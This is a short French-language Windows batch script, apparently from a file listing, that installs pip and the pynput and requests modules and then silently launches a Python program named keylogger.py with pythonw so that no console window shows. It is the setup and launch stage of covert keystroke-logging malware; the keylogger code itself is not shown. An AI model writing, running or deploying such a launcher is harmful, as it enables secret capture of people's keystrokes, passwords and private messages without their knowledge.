Réduire
Nouveau Document texte (4).py
3 Ko
@echo off
REM Installer pip si nécessaire
python -m ensurepip --upgrade

REM Installer les modules nécessaires
pip install --upgrade pynput requests

REM Lancer le keylogger Python sans fenêtre console (avec pythonw)
start "" pythonw.exe keylogger.py

exit